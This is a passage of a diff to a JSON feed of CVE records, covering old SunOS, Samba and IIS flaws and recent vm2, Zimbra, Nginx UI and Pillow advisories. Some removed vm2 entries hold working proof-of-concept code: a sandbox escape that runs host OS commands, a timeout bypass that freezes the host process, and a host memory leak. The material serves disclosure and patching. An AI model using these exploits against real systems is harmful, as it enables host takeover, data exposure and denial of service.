-      "summary": "NFS on SunOS 4.1 through 4.1.2 ignores the high order 16 bits in a 32 bit UID, which allows a local user to gain root access if the lower 16 bits are set to 0, as fixed by the NFS jumbo patch upgrade.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "1992-12-30",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/117&type=0&nav=sec.sba",
-        "http://www.cert.org/advisories/CA-1992-15.html",
-        "http://www.securityfocus.com/bid/47",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/82",
-        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/117&type=0&nav=sec.sba"
-      ],
-      "vulnerableProducts": [
-        "unknown"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-1507",
-      "summary": "Sun SunOS 4.1 through 4.1.3 allows local attackers to gain root access via insecure permissions on files and directories such as crash.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "1993-02-03",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.cert.org/advisories/CA-1993-03.html",
-        "http://www.securityfocus.com/bid/59",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/521",
-        "http://www.cert.org/advisories/CA-1993-03.html",
-        "http://www.securityfocus.com/bid/59"
-      ],
-      "vulnerableProducts": [
-        "unknown"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-0196",
-      "summary": "Multiple buffer overflows in Samba before 2.2.8a may allow remote attackers to execute arbitrary code or cause a denial of service, as discovered by the Samba team and a different vulnerability than CVE-2003-0201.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "2003-05-05",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=104973186901597&w=2",
-        "http://marc.info/?l=bugtraq&m=104974612519064&w=2",
-        "http://www.debian.org/security/2003/dsa-280",
-        "http://www.mandriva.com/security/advisories?name=MDKSA-2003:044",
-        "http://www.redhat.com/support/errata/RHSA-2003-137.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-0223",
-      "summary": "Cross-site scripting vulnerability (XSS) in the ASP function responsible for redirection in Microsoft Internet Information Server (IIS) 4.0, 5.0, and 5.1 allows remote attackers to embed a URL containing script in a redirection message.",
-      "cvssScore": 6.8,
+      "id": "CVE-2002-0748",
+      "summary": "LabVIEW Web Server 5.1.1 through 6.1 allows remote attackers to cause a denial of service (crash) via an HTTP GET request that ends in two newline characters, instead of the expected carriage return/newline combinations.",
+      "cvssScore": 5,
       "severity": "Medium",
-      "published": "2003-06-09",
+      "published": "2002-08-12",
       "modified": null,
       "cwe": null,
       "references": [
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2003/ms03-018",
-        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A66",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2003/ms03-018",
-        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A66"
+        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0323.html",
+        "http://digital.ni.com/public.nsf/websearch/4C3F86E655E5389886256BA00064B22F?OpenDocument",
+        "http://www.iss.net/security_center/static/8919.php",
+        "http://www.osvdb.org/5119",
+        "http://www.securityfocus.com/bid/4577"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0633",
-      "summary": "Rejected reason: DO NOT USE THIS CANDIDATE NUMBER.  ConsultIDs: None.  Reason: this candidate is solely about a configuration that does not directly introduce security vulnerabilities, so it is more appropriate to cover under the Common Configuration Enumeration (CCE).  Notes: the former description is: \"The HTTP/WWW service is running.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "1999-01-01",
-      "modified": null,
-      "cwe": null,
-      "references": [],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-0634",
-      "summary": "Rejected reason: DO NOT USE THIS CANDIDATE NUMBER.  ConsultIDs: None.  Reason: this candidate is solely about a configuration that does not directly introduce security vulnerabilities, so it is more appropriate to cover under the Common Configuration Enumeration (CCE).  Notes: the former description is: \"The SSH service is running.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "1999-01-01",
-      "modified": null,
-      "cwe": null,
-      "references": [],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-0635",
-      "summary": "The echo service is running.",
-      "cvssScore": 0,
-      "severity": "Low",
-      "published": "1999-01-01",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://lists.grok.org.uk/pipermail/full-disclosure/2006-January/041434.html",
-        "http://secunia.com/advisories/18514",
-        "http://lists.grok.org.uk/pipermail/full-disclosure/2006-January/041434.html",
-        "http://secunia.com/advisories/18514"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-0637",
-      "summary": "The systat service is running.",
-      "cvssScore": 0,
-      "severity": "Low",
-      "published": "1999-01-01",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "https://www.cve.org/CVERecord?id=CVE-1999-0637",
-        "https://www.cve.org/CVERecord?id=CVE-1999-0637"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-0638",
-      "summary": "The daytime service is running.",
-      "cvssScore": 0,
-      "severity": "Low",
-      "published": "1999-01-01",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "https://www.cve.org/CVERecord?id=CVE-1999-0638",
-        "https://www.cve.org/CVERecord?id=CVE-1999-0638"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-0639",
-      "summary": "The chargen service is running.",
-      "cvssScore": 0,
-      "severity": "Low",
-      "published": "1999-01-01",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "https://www.cve.org/CVERecord?id=CVE-1999-0639",
-        "https://www.cve.org/CVERecord?id=CVE-1999-0639"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-60096",
-      "summary": "Rejected reason: This CVE ID has been rejected or withdrawn by its CVE Numbering Authority.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-09-25",
-      "modified": "2026-09-25",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-60096"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-97864",
-      "summary": "A vulnerability has been found in GibbonEdu Gibbon up to 30.0.01. The affected element is the function makeBlock of the file modules/Planner/units_add_blockAjax.php of the component Unit Planner. The manipulation of the argument gibbonUnitBlockID/mode leads to missing authentication. The attack is possible to be carried out remotely. The exploit has been disclosed to the public and may be used. Upgrading to version 31.0.00 is sufficient to fix this issue. The identifier of the patch is 07e719368eae8dfb4e22e19424ceab6074164ebc. It is recommended to upgrade the affected component.",
-      "cvssScore": 5.3,
-      "severity": "Medium",
-      "published": "2026-09-25",
-      "modified": "2026-09-25",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-97864",
-        "https://github.com/GibbonEdu/core/pull/2090",
-        "https://github.com/GibbonEdu/core/pull/2095",
-        "https://github.com/GibbonEdu/core/commit/07e719368eae8dfb4e22e19424ceab6074164ebc",
-        "https://github.com/GibbonEdu/core/compare/v31.0.00"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-93642",
-      "summary": "An unauthenticated sender can forge a share notification that triggers stored XSS when a signed-in Zimbra Modern recipient clicks Accept Share, allowing the attacker to access mailbox data and act as the victim.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "2026-09-25",
-      "modified": "2026-09-25",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-93642",
-        "https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-93641",
-      "summary": "An unauthenticated sender can forge a share notification that triggers stored XSS when a signed-in Zimbra Classic recipient clicks Accept Share, allowing the attacker to access mailbox data and act as the victim.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "2026-09-25",
-      "modified": "2026-09-25",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-93641",
-        "https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-97865",
-      "summary": "A security flaw has been discovered in Open-Web-Analytics up to 1.8.1. Affected is the function Event::loadFromArray of the file queue.php of the component Remote Event Queue Endpoint. Performing a manipulation results in deserialization. The attack can be initiated remotely. Upgrading to version 1.8.2 is able to address this issue. The patch is named 78c1222ec0e2119d84684032da1541120a2cdd23. The affected component should be upgraded.",
-      "cvssScore": 6.4,
-      "severity": "Medium",
-      "published": "2026-09-25",
-      "modified": "2026-09-25",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-97865",
-        "https://github.com/Open-Web-Analytics/Open-Web-Analytics/issues/960",
-        "https://github.com/Open-Web-Analytics/Open-Web-Analytics/pull/967",
-        "https://github.com/Open-Web-Analytics/Open-Web-Analytics/commit/78c1222ec0e2119d84684032da1541120a2cdd23",
-        "https://github.com/Open-Web-Analytics/Open-Web-Analytics"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-92942",
-      "summary": "### Vulnerability Summary\n \nvm2's `VM({ timeout })` option is documented and relied upon as the mechanism that bounds how long sandboxed code may execute. In the current implementation, the timeout only wraps the single synchronous call to `VM#run()` (via `doWithTimeout` → `this._runScript(script)` in `lib/vm.js`). It does not, and structurally cannot, bound code that the V8 engine itself schedules to run *after* that call has already returned.\n \n`FinalizationRegistry` and `WeakRef` are exposed to sandboxed code completely unmodified — they are not present anywhere in `lib/setup-sandbox.js`'s list of specially-wrapped/hardened globals (only `WeakMap`, `Promise`, `Proxy`, `Reflect`, etc. receive hardening there). Sandboxed code can register a `FinalizationRegistry` callback against an object it creates and immediately drops. `VM#run()` returns normally, well within the configured timeout, because registration is instant. At some later point — determined entirely by the V8 garbage collector, and forceable on demand by the host process (e.g. under memory pressure, or via `--expose-gc`) — the engine invokes the sandboxed cleanup callback directly. This invocation is **not** mediated by `doWithTimeout`, `Script.runInContext({timeout})`, or any other vm2 accounting mechanism, because it isn't a new call to `VM#run()` at all — it's the GC's own native callback-invocation path.\n\n## Affected Code & Version\n \n- **Repository:** `patriksimek/vm2`\n- **Version tested:** `3.11.6` (commit `a5b31cd9c01b37139aa9c71df1c691a6d1b440f9`, 2026-08-14) — the current `main` branch, i.e. this reproduces on the latest release, after all 2026 CVE-wave fixes (CVE-2026-22709, CVE-2026-26956, and the May 2026 13-advisory batch).\n- **`lib/vm.js`, `run()` (~line 501) and `doWithTimeout()` (~line 105):** the `timeout` option only wraps the single call to `this._runScript(script)`. No mechanism exists to bound execution triggered by engine-internal callbacks scheduled outside that call.\n- **`lib/setup-sandbox.js`, lines 1–14:** the module's captured/hardened globals list (`LocalWeakMap`, `LocalProxy`, `LocalError`, etc.) does not include `FinalizationRegistry` or `WeakRef`. Repo-wide `grep` for `FinalizationRegistry|WeakRef` returns zero matches in `lib/`, confirming neither receives any wrapping, restriction, or special handling — they are exposed to sandboxed code as bare, fully-functional constructors.\n## Steps to Reproduce\n \nEnvironment: Node.js v22.22.2, vm2 checked out at the commit above, dependencies installed with `npm install`.\n \n1. Clone and install:\n```\n   git clone https://github.com/patriksimek/vm2.git\n   cd vm2 && npm install\n```\n2. Save as `poc_timeout_bypass.js` in the repo root:\n```js\n   const { VM } = require('./lib/main.js');\n \n   const CONFIGURED_TIMEOUT_MS = 200;\n   const vm = new VM({ timeout: CONFIGURED_TIMEOUT_MS });\n \n   const t0 = Date.now();\n   let runError = null;\n   try {\n     vm.run(`\n       let target = {};\n       const registry = new FinalizationRegistry(() => {\n         const busyStart = Date.now();\n         while (Date.now() - busyStart < 3000) { /* burn CPU, block event loop */ }\n       });\n       registry.register(target, 'held-value');\n       target = null; // drop only strong reference -> GC-eligible\n     `);\n   } catch (e) { runError = e.message; }\n   const t1 = Date.now();\n   console.log('vm.run() returned after', t1 - t0, 'ms. Threw:', runError);\n \n   if (!global.gc) { console.log('Re-run with --expose-gc'); process.exit(1); }\n   global.gc(); global.gc();\n \n   const timerScheduledAt = Date.now();\n   setTimeout(() => {\n     const delay = Date.now() - timerScheduledAt;\n     console.log('Host setTimeout(10ms) actually fired after', delay, 'ms');\n     console.log('Total wall time since vm.run() returned:', Date.now() - t1, 'ms');\n   }, 10);\n```\n3. Run: `node --expose-gc poc_timeout_bypass.js`\n4. **Observed output:**\n```\n   vm.run() returned after 2 ms. Threw: null\n   Host setTimeout(10ms) actually fired after 3000 ms\n   Total wall time since vm.run() returned: 3029 ms\n```\n5. **Interpretation:** `run()` returned in 2ms, well inside the configured 200ms timeout — vm2 believes execution completed safely. A host-side timer scheduled for 10ms did not fire until ~3000ms later, proving the entire Node.js event loop — not just the sandbox — was blocked by sandboxed code running 15x longer than the configured timeout, entirely after `run()` had returned and outside any timeout enforcement.\n6. `typeof FinalizationRegistry` and `typeof WeakRef` inside a fresh `VM()` both evaluate to `\"function\"` with no wrapping, confirming the surface is reachable by design, not by an incidental leak.\n## Fix Recommendation\n \nPick one or combine:\n \n1. **Remove `FinalizationRegistry` and `WeakRef` from the sandbox global scope by default.** These are rarely needed by untrusted scripts and their GC-driven, engine-scheduled invocation model is fundamentally incompatible with a wall-clock `timeout` promise. Delete them from the context in `lib/setup-sandbox.js` alongside the other hardening done there, mirroring how other dangerous globals are handled.\n2. **If they must remain available**, wrap `FinalizationRegistry`'s constructor so the callback the sandbox supplies is itself invoked through a host-side dispatcher that re-applies a fresh per-invocation timeout (e.g. via `Script.runInContext` with `timeout` again, or by tracking cumulative CPU time via `process.hrtime`/`Isolate::TerminateExecution` if this is ever ported to a true isolate model). A callback that exceeds its budget should be forcibly terminated the same way an over-budget `run()` call is today.\n3. **Document the gap explicitly** if neither is implemented immediately: the current README/docs describe `timeout` as bounding sandboxed execution without qualification. At minimum, callers should be warned that GC-triggered callbacks (`FinalizationRegistry`) are exempt.\n\nany application that runs untrusted code through vm2 with a `timeout` expecting it to bound total CPU time can be denied service indefinitely. A single-line sandboxed script (`registry.register(target, x)` then drop the reference) can queue an unbounded busy-loop that fires at an unpredictable future moment and freezes the entire host Node.js process (single-threaded event loop) for as long as the attacker's loop runs — with no relationship at all to the configured `timeout` value. Because the freeze happens asynchronously and disconnected from the triggering `run()` call, it also undermines incident response: by the time the hang is observed, the `run()` call that caused it may be long gone from logs/traces.\n \nThis is a **timeout-enforcement bypass / uncontrolled resource consumption** issue, not (as currently demonstrated) a proxy/realm escape to host object access — sandboxed code stays within its own realm. See \"What this report does not claim\" below.",
+      "id": "CVE-2026-107805",
+      "summary": "## Summary\n\nIn Nginx UI versions 2.5.0 through 2.5.x, the node-signature authentication path staged an attacker-controlled request body in a temporary file and synchronized it to disk before validating the body digest and cryptographic signature. An unauthenticated remote client that can reach the API can provide syntactically valid signature metadata and cause storage and I/O consumption before the request is rejected.\n\n## Impact\n\nConcurrent malicious requests can consume temporary filesystem capacity, disk I/O, and request-processing resources, potentially disrupting Nginx UI and other services that share the filesystem. The issue affects availability only; it does not bypass authentication and does not provide confidentiality or integrity impact. Deployment-specific reverse-proxy body limits, filesystem quotas, and concurrency limits may reduce practical impact.\n\n## Remediation\n\nUpgrade to Nginx UI 2.6.0 or later. The fix authenticates signed request metadata before staging the body and enforces an application-level streaming size limit with cleanup for rejected requests.\n\nFix commit: https://github.com/0xJacky/nginx-ui/commit/8c9b9a1aff218ee6c980d047b750e49da3c46796",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2026-10-05",
-      "modified": "2026-10-05",
+      "published": "2026-10-09",
+      "modified": "2026-10-09",
       "cwe": {
         "cwe_id": "CWE-400",
         "name": "Uncontrolled Resource Consumption"
       },
       "references": [
-        "https://github.com/patriksimek/vm2/security/advisories/GHSA-r4fx-v8hh-22mv",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-92942",
-        "https://github.com/patriksimek/vm2/commit/fe2fcca2a1e693548993eccc624489dc4cb586b4",
-        "https://github.com/patriksimek/vm2/releases/tag/v3.11.7",
-        "https://www.vulncheck.com/advisories/vm2-before-3.11.7-timeout-bypass-via-finalizationregistry"
+        "https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-j3hg-9rp3-5hw9",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-107805",
+        "https://github.com/0xJacky/nginx-ui/commit/8c9b9a1aff218ee6c980d047b750e49da3c46796",
+        "https://github.com/0xJacky/nginx-ui/releases/tag/v2.6.0",
+        "https://github.com/advisories/GHSA-j3hg-9rp3-5hw9"
       ],
       "vulnerableProducts": [
-        "vm2 npm"
+        "github.com/0xJacky/Nginx-UI go"
       ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-92946",
-      "summary": "## Summary\n\n`NodeVM`'s `require.external` option lets sandboxed code `require()` local files and npm packages. When `require.external` is enabled and `require.root` is **not explicitly set to a path that excludes `node_modules`**, two defaults combine to fully defeat the sandbox:\n\n- `require.root` defaults to **unrestricted** — \"if omitted every path is allowed.\"\n- `require.context` defaults to **`\"host\"`** — files loaded this way run through the **real Node.js `require()`**, not inside any vm2 sandbox.\n\nSandboxed code can therefore `require()` a relative or absolute path to vm2's own installed package (`node_modules/vm2`), obtain the real, unwrapped `NodeVM`/`VM` classes, construct a brand-new **unrestricted** nested `NodeVM` instance, and execute arbitrary host OS commands via `child_process`.\n\nThis is exploitable using **vm2's own documented \"Quick Examples\" configuration** in `README.md`:\n\n```js\nconst vm = new NodeVM({\n  require: {\n    external: true,\n    root: './',\n  },\n});\n```\n\n`root: './'` reads as a safety restriction but, in any ordinary npm project layout, `./node_modules/vm2` sits inside that same directory tree — so the restriction does not exclude vm2 itself. An application built by following the README's quick-start guide is affected by default.\n\n## Affected Versions\n\nAll vm2 versions where `lib/resolver-compat.js`'s `makeResolverFromLegacyOptions` predates this report — confirmed present as of the current `main` (post-3.11.5, including all fixes through GHSA-8hg8-63c5-gwmx / Category 25 and GHSA-cp6g-6699-wx9c / Category 24). Neither of those prior fixes covers this code path (see Root Cause).\n\n## Details / Root Cause\n\n`lib/resolver-compat.js`:\n\n```js\nconst {\n  builtin: builtinOpt,\n  mock: mockOpt,\n  external: externalOpt,\n  root: rootPaths,\n  resolve: customResolver,\n  customRequire: hostRequire = defaultRequire,\n  context = 'host',          // <-- defaults to 'host'\n  strict = true,\n  fs: fsOpt = DEFAULT_FS,\n} = options;\n...\nif (!externalOpt) return new Resolver(fsOpt, [], builtins);\n...\nlet checkedRootPaths;\nif (rootPaths !== undefined) {\n  // root is only canonicalized/validated if the embedder explicitly provided one.\n  ...\n}\n```\n\nand `CustomResolver.isPathAllowed`:\n\n```js\nisPathAllowed(filename) {\n  if (this.rootPaths === undefined) return true;   // <-- unrestricted when root is omitted\n  ...\n}\n```\n\nand `CustomResolver.loadJS`:\n\n```js\nloadJS(vm, mod, filename) {\n  if (this.pathContext(filename, 'js') !== 'host') return super.loadJS(vm, mod, filename);\n  const m = this.hostRequire(filename);   // <-- real host require(), when context === 'host' (the default)\n  mod.exports = vm.readonly(m);\n}\n```\n\n`CustomResolver` (the resolver used whenever `require.external` is a bare `true`, i.e. not a scoped array/object) has **no external-module-name allowlist at all** — it gates purely on `isPathAllowed`, which is a no-op when `root` isn't set. Combined with `context` defaulting to `'host'`, any absolute or root-relative path sandboxed code names is loaded and *executed* via the real, unsandboxed Node.js `require()`.\n\n**This is a distinct code path from the two already-fixed advisories that produce a similar end state:**\n\n- **Category 24 / GHSA-cp6g-6699-wx9c** (`require.root` symlink bypass) *assumes* `root` is configured and attacks the symlink boundary via a TOCTOU between `path.resolve()` and the native loader's symlink-following. `git log -- lib/resolver-compat.js` shows its fix (`realpath` canonicalization) is the *only* history that file has — nothing from the `nesting` fix touches it, and the fix does nothing when `root` is never set in the first place, since there is no boundary to attack via symlink.\n- **Category 25 / GHSA-8hg8-63c5-gwmx** (`nesting: true` bypass) closes a *different* delivery mechanism entirely — the `NESTING_OVERRIDE`-injected `vm2` builtin, gated by a constructor-time check on the `nesting` option. That check is never consulted by this path: an embedder with `nesting: false` (the default) and no dangerous `require.builtin` entries is still fully exposed via `require.external: true` alone.\n\nAn embedder who has correctly mitigated both prior advisories remains completely open through this one.\n\n**Documentation framing does not mitigate this to \"expected behavior.\"** `require.external`'s JSDoc does carry an inline warning (\"`root` should be set to restrict the script from requiring any module\"), but it is unbolded prose stating a default, not flagged as dangerous — materially weaker than `nesting: true`'s bolded **WARNING**, dedicated README section, and explicit \"grants unrestricted host module access\" language, all of which existed and still did not prevent `nesting` from being filed (twice: GHSA-8hg8-63c5-gwmx, then hardened again by GHSA-m4wx-m65x-ghrr). The literal, first-shown \"Quick Examples\" snippet in `README.md` sets `root: './'`, which reads as an active safety choice, not an acknowledgment of \"every path is allowed.\"\n\n## Proof of Concept\n\nSee attached `poc.js`. Reproduces using **vm2's own documented Quick Examples config**, in a normal project layout (`poc.js` next to a real `node_modules/vm2` install) — no symlinks, no `nesting`, no dangerous `require.builtin` entries, no modification to vm2's source.\n\n```js\nconst path = require('path');\nconst { NodeVM } = require('vm2');\n\nconst vm = new NodeVM({\n  require: { external: true, root: './' },   // verbatim from README \"Quick Examples\"\n});\n\nlet vm2EntryPoint = path.relative(process.cwd(), require.resolve('vm2')).replace(/\\\\/g, '/');\nif (!vm2EntryPoint.startsWith('.')) vm2EntryPoint = './' + vm2EntryPoint;\n\nconst result = vm.run(`\n  const real = require(${JSON.stringify(vm2EntryPoint)});\n  const inner = new real.NodeVM({ require: { builtin: ['child_process'], external: false } });\n  module.exports = inner.run(\"module.exports = require('child_process').execSync('whoami').toString().trim()\", 'inner.js');\n`, 'untrusted-plugin.js');\n\nconsole.log(result); // real host username, e.g. \"Abisheik M\"\n```\n\n**Actual output on the test machine:**\n```\n{ whoami: 'Abisheik M', platform: 'win32' }\n```\n\n`Abisheik M` is the real OS account executing the Node.js process — not a sandbox artifact.\n\n## Impact\n\nAny application that follows vm2's own README \"Quick Examples\" pattern (or any config with `require.external` enabled and `require.root` set to a path that includes `node_modules`, or omitted entirely) allows sandboxed/untrusted code to:\n\n- Execute arbitrary OS commands via `child_process` (full RCE).\n- Read/write arbitrary files via `fs` (once inside the re-instantiated unrestricted `NodeVM`).\n- Fully defeat every other sandbox restriction the embedder configured on the *outer* `NodeVM` — the outer allowlist becomes irrelevant once the sandbox obtains an unrestricted inner instance.\n\n## Suggested Fix\n\nMirror the precedent already established for `nesting` (Category 25) and `require.root` (Category 24): **fail loudly at construction time instead of silently defaulting to an unsafe combination.**\n\nIn `lib/resolver-compat.js`'s `makeResolverFromLegacyOptions`, when `externalOpt` is truthy (bare `true`, or an object/array not scoped to specific module names only) and `rootPaths === undefined`, throw a `VMError` at `new NodeVM(...)` construction time — extending the *same* `checkedRootPaths` eager-probe block that Category 24's fix already introduced for the \"root is set but the fs adapter can't realpath\" case, to also cover \"root was never set at all.\" This forces embedders to make an explicit, informed choice rather than inheriting an unrestricted default, exactly mirroring how Category 25's fix forces an explicit non-default `require` object when `nesting: true` is set.\n\nAdditionally: update `README.md`'s \"Quick Examples\" snippet so it no longer shows a `root` value that is silently vulnerable to a same-directory `node_modules` install (e.g. scope it below the project root, or add an explicit callout that `root` must exclude `node_modules`).",
+      "id": "CVE-2000-0854",
+      "summary": "When a Microsoft Office 2000 document is launched, the directory of that document is first used to locate DLL's such as riched20.dll and msi.dll, which could allow an attacker to execute arbitrary commands by inserting a Trojan Horse DLL into the same directory as the document.",
       "cvssScore": 10,
       "severity": "Critical",
-      "published": "2026-10-05",
-      "modified": "2026-10-05",
-      "cwe": {
-        "cwe_id": "CWE-913",
-        "name": "Improper Control of Dynamically-Managed Code Resources"
-      },
-      "references": [
-        "https://github.com/patriksimek/vm2/security/advisories/GHSA-j3hm-6rg5-mchv",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-92946",
-        "https://github.com/patriksimek/vm2/commit/903017c8a1eae9aba947ec854468b48155e79f86",
-        "https://github.com/patriksimek/vm2/releases/tag/v3.11.7",
-        "https://www.vulncheck.com/advisories/vm2-before-3.11.7-remote-code-execution-via-require-external"
-      ],
-      "vulnerableProducts": [
-        "vm2 npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-92947",
-      "summary": "### Summary\nSandboxed code is able to disclose host memory used by small allocations by `Buffer.from`, `Buffer.concat`.\n\n### Details\nvm2 exposes `Buffer` object to sandboxed code by default. Small [`Buffer` allocations](https://nodejs.org/api/buffer.html#static-method-bufferallocunsafesize) (for example, [Buffer.allocUnsafe()](https://nodejs.org/api/buffer.html#static-method-bufferallocunsafesize), [Buffer.from(array)](https://nodejs.org/api/buffer.html#static-method-bufferfromarray), [Buffer.from(string)](https://nodejs.org/api/buffer.html#static-method-bufferfromstring-encoding), and [Buffer.concat()](https://nodejs.org/api/buffer.html#static-method-bufferconcatlist-totallength)) use the same Buffer pool, which is shared with the sandbox. This allows sandboxed code to disclose host memory used by the functions listed above.\n\n### PoC\nTested against `vm2@3.11.5` in the node REPL.\n```javascript\nBuffer.from('host-memory-should-not-leak-to-sandbox')\nnew (require('vm2').VM)().run(`Buffer.from(Buffer.from([0]).buffer, 0, Buffer.from([0]).buffer.byteLength).toString('ascii')`)\n```\n\n<img width=\"1044\" height=\"104\" alt=\"Screenshot 2026-07-23 at 17 54 15\" src=\"https://github.com/user-attachments/assets/987b860c-6702-4818-bfaa-c77919c777e5\" />\n\n### Impact\nSince sandbox acquires an ArrayBuffer that is used by the host, it can disclose sensitive data going through functions mentioned above and even write to these buffers, which can lead to sensitive data exposure and potentially denial-of-service.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "2026-10-05",
-      "modified": "2026-10-05",
-      "cwe": {
-        "cwe_id": "CWE-200",
-        "name": "Exposure of Sensitive Information to an Unauthorized Actor"
-      },
-      "references": [
-        "https://github.com/patriksimek/vm2/security/advisories/GHSA-fcqc-726x-5wfc",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-92947",
-        "https://github.com/patriksimek/vm2/commit/4f2508abeb252aa86eb6761c78b3b000248fb089",
-        "https://github.com/patriksimek/vm2/releases/tag/v3.11.7",
-        "https://www.vulncheck.com/advisories/vm2-before-3.11.7-memory-disclosure-via-buffer-pool"
-      ],
-      "vulnerableProducts": [
-        "vm2 npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-0200",
-      "summary": "HSWeb 2.0 HTTP server allows remote attackers to obtain the physical path of the server via a request to the /cgi/ directory, which will list the path if directory browsing is enabled.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2001-05-03",
+      "published": "2000-11-14",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2001-02/0052.html",
-        "http://www.securityfocus.com/bid/2336",
-        "http://archives.neohapsis.com/archives/bugtraq/2001-02/0052.html",
-        "http://www.securityfocus.com/bid/2336"
+        "http://archives.neohapsis.com/archives/bugtraq/2000-09/0277.html",
+        "http://archives.neohapsis.com/archives/ntbugtraq/2000-q3/0155.html",
+        "http://archives.neohapsis.com/archives/win2ksecadvice/2000-q3/0117.html",
+        "http://www.securityfocus.com/bid/1699",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5263"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2001-0202",
-      "summary": "Picserver web server allows remote attackers to read arbitrary files via a .. (dot dot) attack in an HTTP GET request.",
-      "cvssScore": 5,
+      "id": "CVE-2026-112395",
+      "summary": "### Summary\n\nPillow's libImaging `_decodeTile` decoder, used to decode tiled TIFF images, allocates a per-tile buffer using `realloc(state->buffer, TIFFTileSize(tiff))`. After each `TIFFReadTile` it then iterates `tile_y` from 0 up to `current_tile_length` and calls the configured row unpacker (here `copy4`) with the source pointer `state->buffer + tile_y * row_byte_size`. When libtiff returns a `tile_bytes_size` smaller than the worst-case `row_byte_size * tile_length`, the inner stride-and-copy loop walks past the realloc'd region and `copy4` performs a 1024-byte `memcpy` that reads up to `(tile_length-1) * row_byte_size + row_byte_size` bytes from a buffer sized only to `tile_bytes_size`. The supplied PoC TIFF triggers a 1024-byte over-read exactly 0 bytes past a 196608-byte allocation. An attacker who can convince a Pillow-using application to decode a crafted TIFF can trigger a process crash (DoS) and may cause adjacent heap memory to be copied into the decoded pixel buffer.\n\n### Details\n\nPillow's TIFF decoder, when libtiff reports the file is tiled, takes the `_decodeTile` path. The function:\n\n1. Asks libtiff for `TIFFTileSize(tiff)` (the bytes-per-tile) and `TIFFTileRowSize(tiff)` (the bytes per row *as stored by libtiff*).\n2. Reallocates `state->buffer` to exactly `tile_bytes_size`.\n3. For each tile origin `(x, y)` and each plane, calls `TIFFReadTile` into `state->buffer`, then walks the tile row by row, calling the configured `ImagingShuffler` (here `copy4`) on each row's worth of source bytes.\n\nThe validation done before the loop is:\n\n```c\nif (tile_bytes_size > ((tile_length * state->bits / planes + 7) / 8) * tile_width) {\n    state->errcode = IMAGING_CODEC_BROKEN;\n    return -1;\n}\n```\n\nThis rejects oversized libtiff tiles, but it does **not** reject *undersized* ones — i.e. the case where libtiff returns a `tile_bytes_size` strictly **less** than 